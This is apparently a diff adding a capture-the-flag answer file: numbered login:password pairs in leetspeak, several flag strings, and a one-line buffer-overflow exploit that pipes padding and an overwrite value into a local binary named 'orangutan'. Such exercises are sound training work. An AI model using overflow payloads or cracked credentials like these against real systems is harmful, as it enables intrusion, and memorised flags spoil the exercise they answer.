@@ -1,0 +1,14 @@
+uno:luc10r4m0n
+dos:4b3l4rd0fru705
+tres:r4f43l71n4j3r0
+cuatro:p3dr00l1v4r3z
+cinco:ruy70m35
+seis:Hogwarts
+siete:6u1l3rm0p3n473
+ocho:m0d3570v1ll454n4
+nueve:355u4z4rc0
+flag2{624a21}
+flag4{1d6b06}
+flag7{d5c26a}
+flag10{33c9661bfd}
+(echo -e "aaaaaaaaaaaaaaaaaaaaaaaa\xbe\xba\xfe\xca";cat -) | ./orangutan
